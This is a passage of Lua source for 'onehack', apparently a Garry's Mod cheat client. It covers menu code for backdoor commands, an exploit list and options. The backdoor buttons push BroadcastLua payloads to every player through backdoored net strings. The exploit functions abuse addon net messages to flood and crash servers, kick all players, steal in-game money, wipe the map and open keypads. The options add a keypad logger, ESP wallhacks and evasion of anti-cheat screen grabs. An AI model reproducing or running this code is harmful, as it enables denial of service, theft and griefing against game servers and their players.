		onehack.AddFunction("Музыка - ТОМАС.", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://fl.bisyor.net/uploads/ru/2018/04/Alley-gang-paravozik-tomas_[www.Bisyor.net].mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Томас\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
	--
		onehack.AddFunction("Музыка - DSD512►Lindsey Stirling Shatter Me", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://ru.drivemusic.cc/dl/XYbi6hfhrl28jZHmLCG9Qw/1545785442/download_music/2014/04/lindsey-stirling-feat.-lzzy-hale-shatter-me.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"DSD512►Lindsey Stirling Shatter Me\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		onehack.AddFunction("Музыка - Вишневая семё ка", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://dropmp3.ru/uploads/files/2018-08/1535648946_oni-vishnevaya-semerka.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Вишневая семё ка\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
		onehack.AddFunction("Музыка - ООООООООООО ", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono\", function()end ); chat.AddText(,Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"-Уши\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
		onehack.AddFunction("Музыка - Obeme", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/9Aed.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Обеме\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
		--
		onehack.AddFunction("Музыка - Денза", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/94TW.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"Денза\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
		onehack.AddFunction("Музыка - Big baby tape", "sound", buttlistback, function()
			onehack.NetStart( onehack.selectedbackdoor )
			net.WriteString("BroadcastLua([[sound.PlayURL( \"https://zenmusic.org/get/music/20181121/zenmusicorg_Big_Baby_Tape_-_YA_VZYAL_TVOYU_BU_I_YA_EJO_EBU_60457129.mp3\", \"mono\", function()end ); chat.AddText(Color(255,255,255),\"Сейчас иг ает: \",Color(100,255,100),\"BABY TAPE\")]])")
			net.WriteBit(1)
			net.SendToServer()
		end)
 
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 1
		onehack.selectedpanel = onehackdooropt
	end
 
	function exploitmenuopt()
		exploitmenuopt = vgui.Create( "DPanel" , framesag )
		exploitmenuopt:SetPos( 126, 9 )
		exploitmenuopt:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function exploitmenuopt:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
		end
 
		onehack.exploitspanel = vgui.Create( "DPanel", exploitmenuopt )
		onehack.exploitspanel:SetPos(160,5)
		onehack.exploitspanel:SetSize(302,373)
		function onehack.exploitspanel:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
 
		onehack.exploitsList = vgui.Create( "DScrollPanel", onehack.exploitspanel )
		onehack.exploitsList:Dock(FILL)
		function onehack.exploitsList:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
		onehack.exploitsList.VBar:SetWidth(1)
		onehack.exploitsList:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploitsList:GetVBar():GetWide(), onehack.exploitsList:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
		onehack.exploitsList:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploitsList:GetVBar().btnUp:GetWide(), onehack.exploitsList:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
		onehack.exploitsList:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploitsList:GetVBar().btnDown:GetWide(), onehack.exploitsList:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
		onehack.exploitsList:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploitsList:GetVBar().btnGrip:GetWide(), onehack.exploitsList:GetVBar().btnGrip:GetTall(), onehack.theme.chroma) end
 
		onehack.exploits_players_list = vgui.Create( "DScrollPanel", exploitmenuopt )
		onehack.exploits_players_list:SetPos(5,25)
		onehack.exploits_players_list:SetSize(150,298)
		function onehack.exploits_players_list:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
		end
		onehack.exploits_players_list.VBar:SetWidth(1)
		onehack.exploits_players_list:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploits_players_list:GetVBar():GetWide(), onehack.exploits_players_list:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
		onehack.exploits_players_list:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploits_players_list:GetVBar().btnUp:GetWide(), onehack.exploits_players_list:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
		onehack.exploits_players_list:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploits_players_list:GetVBar().btnDown:GetWide(), onehack.exploits_players_list:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
		onehack.exploits_players_list:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, onehack.exploits_players_list:GetVBar().btnGrip:GetWide(), onehack.exploits_players_list:GetVBar().btnGrip:GetTall(), onehack.theme.chroma) end
 
		onehack.player_button_prev = vgui.Create( "DButton", exploitmenuopt )
		onehack.player_button_prev:SetText( "" )
		onehack.player_button_prev:SetPos(5,5)
		onehack.player_button_prev:SetSize(150,20)
		function onehack.player_button_prev:Paint( w,h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
			draw.SimpleText("Player list","DermaDefault",w/2,h/2,Color(130,130,130),1,1)
		end
 
		onehack.player_button_all = onehack.exploits_players_list:Add( "DButton" )
		onehack.player_button_all:SetText( "" )
		onehack.player_button_all:Dock( TOP )
		onehack.player_button_all:DockMargin( 0, 0, 0, 0 )
		function onehack.player_button_all:Paint( w,h )
	    	if onehack.player_button_all:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt)
		   	end
		   	if onehack.selected_player == 0 then
				draw.SimpleText("> All player's <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
			else
				draw.SimpleText("All player's","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
			end
		end
		function onehack.player_button_all:DoClick()
			onehack.selected_player = 0
		end
 
		for k,v in pairs(player.GetAll()) do
			local onehack_player_button = onehack.exploits_players_list:Add( "DButton" )
			onehack_player_button:SetText( "" )
			onehack_player_button:Dock( TOP )
			onehack_player_button:DockMargin( 0, 0, 0, 0 )
			onehack_player_button.Paint = function( _, w, h )
		    	if onehack_player_button:IsHovered() then
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt3)
				else
					draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
					draw.RoundedBox(0,1,0,w-2,h-1,onehack.theme.backgroundalt)
			   	end
			   	if onehack.selected_player == v then
					draw.SimpleText("> "..v:Name().." <","DermaDefault",w/2,h/2,onehack.theme.chroma,1,1)
				else
					draw.SimpleText(v:Name(),"DermaDefault",w/2,h/2,Color(255,255,255),1,1)
				end
			end
			function onehack_player_button:DoClick()
				onehack.selected_player = v
			end
		end
 
		onehack.exploitstrip_weapontype = vgui.Create("DTextEntry", exploitmenuopt)
		onehack.exploitstrip_weapontype:SetPos( 5, 329 )
		onehack.exploitstrip_weapontype:SetSize( 150, 25 )
		onehack.exploitstrip_weapontype:SetText( "" )
		onehack.exploitstrip_weapontype.Paint = function( self, w, h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
			self:DrawTextEntryText(onehack.theme.chroma,onehack.theme.chroma,onehack.theme.chroma)
			if onehack.exploitstrip_weapontype:GetValue() == "" then
				draw.SimpleText("Weapon class (* all)","DermaDefault",3,h/2,Color(255,255,255,5),0,1)
			end
		end
 
		onehack.exploitstrip = vgui.Create( "DButton", exploitmenuopt )
		onehack.exploitstrip:SetPos( 5, 353 )
		onehack.exploitstrip:SetSize( 150, 25 )
		onehack.exploitstrip:SetText( "" )
		onehack.exploitstrip.Paint = function( _, w, h )
	    	if onehack.exploitstrip:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Strip Weapon","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
		function onehack.exploitstrip:DoClick()
			if onehack.selected_player ~= 0 then
				local weapons = onehack.selected_player:GetWeapons()
				if not onehack.exploitstrip_weapontype:GetValue() == "*" then
					local stringtotable = string.Explode( ", ", onehack.exploitstrip_weapontype:GetValue() )
					for _, g in pairs( weapons ) do
						for _, s in pairs( stringtotable ) do
							if string.find( string.lower( g:GetClass() ), s ) then
								onehack.StripWeapon( g )
							end
						end
					end
				else
					onehack.StripAllWeapons( weapons )
				end
			else
				for k,v in pairs(player.GetAll()) do
					local weapons = v:GetWeapons()
					if not onehack.exploitstrip_weapontype:GetValue() == "*" then
						local stringtotable = string.Explode( ", ", onehack.exploitstrip_weapontype:GetValue() )
						for _, g in pairs( weapons ) do
							for _, s in pairs( stringtotable ) do
								if string.find( string.lower( g:GetClass() ), s ) then
									onehack.StripWeapon( g )
								end
							end
						end
					else
						onehack.StripAllWeapons( weapons )
					end
				end
			end
 
			
		end
 
		if table.HasValue( onehack.AllNets, "StackGhost" ) then
			onehack.AddExploit("Server Lagger", function()
				timer.Create( onehack.RandomString(10), 0.02, 0, function()
					for i = 1, 2000 do
						onehack.NetStart( str )
						onehack.NetWireInt(69,32)
						onehack.SendToServak()
					end
				end)
			end)
		end
		if table.HasValue( onehack.AllNets, "SyncPrinterButtons76561198056171650" ) then
			onehack.AddExploit("Steal money of printer", function()
				for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
					if v:IsValid() then
						onehack.NetStart( "SyncPrinterButtons76561198056171650" )
						net.WriteEntity(v)
						net.WriteUInt(2, 4)
						onehack.SendToServak()
					end
				end
			end)
		end
		if table.HasValue( onehack.AllNets, "DL_Answering" ) then
			onehack.AddExploit("Kick all", function()
				local function reportQuestionmark()
					for i = 1, 2000 do
						onehack.NetStart("DL_Answering")
						net.SendToServer()
					end
				end
				timer.Create(onehack.RandomString(10),0.1,50,reportQuestionmark)
			end)
		end
		if table.HasValue( onehack.AllNets, "pac_submit" ) then
			onehack.AddExploit("PAC Server Lagger", function()
				timer.Create( onehack.RandomString(10), 0.02, 0, function()
				for i=1, 1000 do
					onehack.NetStart("pac_submit")
					onehack.SendToServak()
				end end)
			end)
		end
		if table.HasValue( onehack.AllNets, "Client_To_Server_OpenEditor" ) then
			onehack.AddExploit("Open menu SCP-249", function()
				onehack.NetStart("Client_To_Server_OpenEditor")
				onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "BuyKey" ) then
			onehack.AddExploit("Blue UnBox buy crate and key", function()
				onehack.NetStart("BuyKey")
				onehack.SendToServak()
				onehack.NetStart("BuyCrate")
				onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "ChangeOrgName" ) then
			onehack.AddExploit("Change org name", function()
				onehack.NetStart("ChangeOrgName")
				onehack.NetWireString("OOOOOOOOMMMMMMMMMMMGOOOOOOOOOOOOOOOOOD!")
				onehack.NetWireString("MY DICK SOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO BIIIIIIIIIIIG!")
				net.WriteEntity(LocalPlayer())
				onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "IS_SubmitSID_C2S" ) then
			onehack.AddExploit("Easy reward", function()
				onehack.NetStart("IS_SubmitSID_C2S")
				onehack.NetWireString("Killa")
				onehack.SendToServak()
				onehack.NetStart("IS_GetReward_C2S")
				onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "IS_SubmitSID_C2S" ) then
			onehack.AddExploit("Easy reward", function()
				onehack.NetStart("IS_SubmitSID_C2S")
				onehack.NetWireString("Killa")
				onehack.SendToServak()
				onehack.NetStart("IS_GetReward_C2S")
				onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "properties" ) then
			onehack.AddExploit("Clear map", function()
				for k,v in pairs(ents.GetAll()) do
		            onehack.NetStart("properties")
		            onehack.NetWireString( "remove" , 32 )
		            net.WriteEntity( v )
		            onehack.SendToServak()
				end
			end)
		end
 
		if table.HasValue( onehack.AllNets, "start_wd_emp" ) then
			onehack.AddExploit("Hack all keypad's", function()
			    onehack.NetStart('start_wd_emp')
			    onehack.SendToServak()
			end)
		end
 
		if table.HasValue( onehack.AllNets, "pac.net.TouchFlexes.ClientNotify" ) then
			onehack.AddExploit("PAC Server Crash", function()
				timer.Create(onehack.RandomString(10), 0, 0, function()
				for i = 1, 400 do
				onehack.NetStart("pac.net.TouchFlexes.ClientNotify")
				net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
				onehack.SendToServak()
				end
				end)
			end)
		end
 
		if table.HasValue( onehack.AllNets, "ItemStoreDrop" ) then
			onehack.AddExploit("ItemStore Lagger", function()
				timer.Create(onehack.RandomString(10), 0, 0, function()
				for i = 1, 1000 do
				onehack.NetStart("ItemStoreDrop")
				net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
				net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
				onehack.SendToServak()
				end
				end)
			end)
		end
 
		if table.HasValue( onehack.AllNets, "TFA_Attachment_RequestAll" ) then
			onehack.AddExploit("TFA Lagger", function()
				timer.Create(onehack.RandomString(10), 0.02, 0, function()
				for i = 1, 4400 do
				onehack.NetStart("TFA_Attachment_RequestAll",true)
				onehack.SendToServak()
				end
				end)
			end)
		end
 
		if table.HasValue( onehack.AllNets, "TFA_Attachment_RequestAll" ) then
			onehack.AddExploit("TFA Lagger", function()
				timer.Create(onehack.RandomString(10), 0.02, 0, function()
				for i = 1, 4400 do
				onehack.NetStart("TFA_Attachment_RequestAll",true)
				onehack.SendToServak()
				end
				end)
			end)
		end
 
		if table.HasValue( onehack.AllNets, "ts_buytitle" ) then
			onehack.AddExploit("Car Dealer Lagger", function()
				timer.Create(onehack.RandomString(10), 0, 0, function()
				for i=1,1000 do
				onehack.NetStart("ts_buytitle",true)
				net.WriteTable({})
				net.WriteTable({})
				net.WriteTable({})
				onehack.SendToServak()
				end
				end )
			end)
		end
 
		if table.HasValue( onehack.AllNets, "EnterpriseWithdraw" ) then
			onehack.AddExploit("Withdraw moneyr", function()
				onehack.NetStart("EnterpriseWithdraw")
				net.WriteInt(100, 32)
				onehack.SendToServak()
			end)
		end
 
		---------------------------------------------------------------------------------------
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 2
		onehack.selectedpanel = exploitmenuopt
	end
 
	function optionsmenuopt()
		optionsmenuopt = vgui.Create( "DPanel" , framesag )
		optionsmenuopt:SetPos( 126, 9 )
		optionsmenuopt:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function optionsmenuopt:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
		end
		local Theme = vgui.Create( "DColorMixer",optionsmenuopt);
		Theme:SetSize(227,227)
		Theme:SetPos(5,5)
		Theme:SetPalette( false )
		Theme:SetWangs( false )
		Theme:SetAlphaBar( false )
		Theme:SetColor(Color(onehack.theme.chroma.r,onehack.theme.chroma.g,onehack.theme.chroma.b))
		function Theme:ValueChanged( color)
			onehack.theme.chroma = Color(color.r,color.g,color.b)
			onehack.theme.chromaalt = Color(onehack.theme.chroma.r-55,onehack.theme.chroma.g-60,onehack.theme.chroma.b-30)
		end
 
		local asg = vgui.Create("DCheckBox",optionsmenuopt)
		asg:SetPos(237,5)
		asg:SetValue(onehack.Vars['ASR'])
		asg:SetSize(130,17)
		function asg:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if asg:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Anti-ScreenGrab","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ASR'] = asg:GetChecked()
		end
 
		local asf = vgui.Create("DCheckBox",optionsmenuopt)
		asf:SetPos(237,27)
		asf:SetValue(onehack.Vars['ASF'])
		asf:SetSize(130,17)
		function asf:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if asf:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Anti-FileSteal","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ASF'] = asf:GetChecked()
		end
 
		local bhop = vgui.Create("DCheckBox",optionsmenuopt)
		bhop:SetPos(237,49)
		bhop:SetValue(onehack.Vars['BHOP'])
		bhop:SetSize(130,17)
		function bhop:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if bhop:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Bhop","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['BHOP'] = bhop:GetChecked()
		end
 
		local WaterMark = vgui.Create("DCheckBox",optionsmenuopt)
		WaterMark:SetPos(237,72)
		WaterMark:SetValue(onehack.Vars['WaterMark'])
		WaterMark:SetSize(130,17)
		function WaterMark:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if WaterMark:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("WaterMark","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['WaterMark'] = WaterMark:GetChecked()
		end
 
		local FreeCamBind = optionsmenuopt:Add( "DButton" )
		FreeCamBind:SetTextColor( Color( 200, 200, 200 ) )
		FreeCamBind:SetText( "" )
		FreeCamBind:SetPos(237,95)
		FreeCamBind:SetSize(225,23)
		function FreeCamBind:Paint( w,h )
	    	if FreeCamBind:IsHovered() then
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt3)
			else
				draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
				draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		   	end
			draw.SimpleText("Spectator Mode","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
		end
 
		FreeCamBind.DoClick = function()
			onehack.SpectateMode()
		end
 
		local netname = vgui.Create( "DComboBox", optionsmenuopt )
		netname:SetPos( 237, 124 )
		netname:SetSize( 225, 23 )
		netname:SetValue( "Select Network String" )
		for _,v in pairs(onehack.foundednets) do
			netname:AddChoice( v )
		end
		netname.OnSelect = function( self, index, value )
			onehack.selectedbackdoor = value
		end
		netname.Paint = function( _, w, h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		end
 
		local weapnoslist = vgui.Create("DCheckBox",optionsmenuopt)
		weapnoslist:SetPos(237,172)
		weapnoslist:SetValue(onehack.Vars['WEAPON_LIST3D'])
		weapnoslist:SetSize(130,17)
		function weapnoslist:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if weapnoslist:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Weapon list","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['WEAPON_LIST3D'] = weapnoslist:GetChecked()
		end
 
		local keypadjef = vgui.Create("DCheckBox",optionsmenuopt)
		keypadjef:SetPos(237,192)
		keypadjef:SetValue(onehack.Vars['keypad_jiw'])
		keypadjef:SetSize(130,17)
		function keypadjef:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if keypadjef:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Keypad logger","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['keypad_jiw'] = keypadjef:GetChecked()
		end
 
		------------------------------------------------------ onehack.Vars['ASR'] 1
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 3
		onehack.selectedpanel = optionsmenuopt
	end
 
	function logsmenuopt()
		logsmenuopt = vgui.Create( "DPanel" , framesag )
		logsmenuopt:SetPos( 126, 9 )
		logsmenuopt:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function logsmenuopt:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
 
			local red = 255 - (onehack.memory["logic"]*2.55)
			local green = onehack.memory["logic"] * 2.55
			local atadd = 52
			draw.RoundedBox(0,5,364,200+atadd,13,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,6,365,(200-2)+atadd,13-2,onehack.theme.backgroundalt)
 
			draw.RoundedBox(0,6, 365, math.Clamp( (onehack.memory["logic"]) * 0.75, 0, 200+atadd)-2, 13-2,Color(green,red, 0, 255) )
			draw.SimpleText("Core memory usage: "..onehack.memory["logic"].."kb","DermaDefault",(90-6)+atadd,363+(13/2),Color(255,255,255,100),1,1)
 
			local red2 = 255 - (onehack.memory["hud"]*2.55)
			local green2 = onehack.memory["hud"] * 2.55
			local atstop = 257
			draw.RoundedBox(0,5+atstop,364,200,13,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,6+atstop,365,200-2,13-2,onehack.theme.backgroundalt)
			local hudmemstext
			if onehack.memory["hud"] < 0 then
				hudmemstext = 0
			else
				hudmemstext = onehack.memory["hud"]
			end
			
			draw.RoundedBox(0,6+atstop, 365, math.Clamp( (onehack.memory["hud"]) * 0.75, 0, 200)-2, 13-2,Color(green2,red2, 0, 255) )
			draw.SimpleText("Visuals memory usage: "..hudmemstext.."kb","DermaDefault",(110-6)+atstop,363+(13/2),Color(255,255,255,100),1,1)
		end
		logsmenuoptrichtext = vgui.Create( "RichText", logsmenuopt )
		logsmenuoptrichtext:SetPos(5, 5)
		logsmenuoptrichtext:SetSize( 457,353 ) --373
		logsmenuoptrichtext.Paint = function( _, w, h )
			draw.RoundedBox(0,0,0,w,h,onehack.theme.backgroundalt2)
			draw.RoundedBox(0,1,1,w-2,h-2,onehack.theme.backgroundalt)
		end
		for idx, tab in pairs(onehack.debug) do
		    logsmenuoptrichtext:InsertColorChange( tab[2].r, tab[2].g, tab[2].b, 255 )
		    logsmenuoptrichtext:AppendText( tab[1].."\n" )
		end
 
		if onehack.selectedpanel != nil then
			onehack.selectedpanel:Remove()
		end
		onehack.selectedpanel_id = 4
		onehack.selectedpanel = logsmenuopt
	end
 
	function esppanel()
		esppanel = vgui.Create( "DPanel" , framesag )
		esppanel:SetPos( 126, 9 )
		esppanel:SetSize( framesag:GetWide()-120-13, framesag:GetTall()-16 )
		function esppanel:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, onehack.theme.backgroundalt )
		end
 
		local esbenable = vgui.Create("DCheckBox",esppanel)
		esbenable:SetPos(5,5)
		esbenable:SetValue(onehack.Vars['ESP'])
		esbenable:SetSize(100,17)
		function esbenable:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if esbenable:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Enabled","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP'] = esbenable:GetChecked()
		end
 
		local shownames = vgui.Create("DCheckBox",esppanel)
		shownames:SetPos(5,27)
		shownames:SetValue(onehack.Vars['ESP_NAME'])
		shownames:SetSize(100,17)
		function shownames:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if shownames:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Name","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_NAME'] = shownames:GetChecked()
		end
 
		local showgroup = vgui.Create("DCheckBox",esppanel)
		showgroup:SetPos(5,49)
		showgroup:SetValue(onehack.Vars['ESP_GROUP'])
		showgroup:SetSize(100,17)
		function showgroup:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showgroup:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("User group","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_GROUP'] = showgroup:GetChecked()
		end
 
		local showteam = vgui.Create("DCheckBox",esppanel)
		showteam:SetPos(5,72)
		showteam:SetValue(onehack.Vars['ESP_TEAM'])
		showteam:SetSize(100,17)
		function showteam:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showteam:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Team name","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_TEAM'] = showteam:GetChecked()
		end
 
		local showhealthnumber = vgui.Create("DCheckBox",esppanel)
		showhealthnumber:SetPos(5,94)
		showhealthnumber:SetValue(onehack.Vars['ESP_HP'])
		showhealthnumber:SetSize(100,17)
		function showhealthnumber:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showhealthnumber:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Health number","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_HP'] = showhealthnumber:GetChecked()
		end
 
		local showhealtbox = vgui.Create("DCheckBox",esppanel)
		showhealtbox:SetPos(5,116)
		showhealtbox:SetValue(onehack.Vars['ESP_HPBOX'])
		showhealtbox:SetSize(100,17)
		function showhealtbox:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showhealtbox:GetChecked() then
				onehack.DrawRect(4,4,h-8,h-8,onehack.theme.chroma)
			end
			onehack.DrawOutLinedRect(0,0,h,h,onehack.theme.backgroundalt2)
			draw.SimpleText("Health box","DermaDefault",24,h/2,Color(255,255,255),0,1)
			onehack.Vars['ESP_HPBOX'] = showhealtbox:GetChecked()
		end
 
		local showarmornumber = vgui.Create("DCheckBox",esppanel)
		showarmornumber:SetPos(5,137)
		showarmornumber:SetValue(onehack.Vars['ESP_ARMOR'])
		showarmornumber:SetSize(100,17)
		function showarmornumber:Paint(w,h)
			onehack.DrawRect(0,0,h,h,onehack.theme.backgroundalt3)
			if showarmornumber:GetChecked() then
